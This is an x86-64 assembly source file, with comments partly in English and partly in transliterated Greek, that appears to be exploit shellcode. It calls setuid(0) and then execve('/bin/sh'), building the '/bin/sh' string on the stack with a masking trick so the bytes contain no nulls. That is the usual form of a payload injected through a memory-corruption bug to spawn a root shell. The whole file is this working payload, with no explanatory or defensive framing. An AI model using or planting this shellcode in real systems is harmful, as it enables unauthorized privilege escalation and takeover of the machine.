global _start
section .text

_start:

    xor rax, rax
    mov al, 105
    xor rdi, rdi
    syscall

    xor rax, rax                    ;rax = 59
    mov al, 59
    
    ;xor rdi, rdi                       ;1st argument = /bin/sh
    push 0x6e69622f
    mov edi, 0xaa68732f
    and edi, 0x55ffffff                         ; ayto gia na ftiaksei to \0 sto telos bgazontas to (aa = kati akuro gia na mhn yparxei 0)
    mov dword [rsp + 4], edi
    mov rdi, rsp
    
    xor rsi, rsi                        ;2nd argument = null
    xor rdx, rdx                        ;3rd argument = null
    syscall                             ;do execve
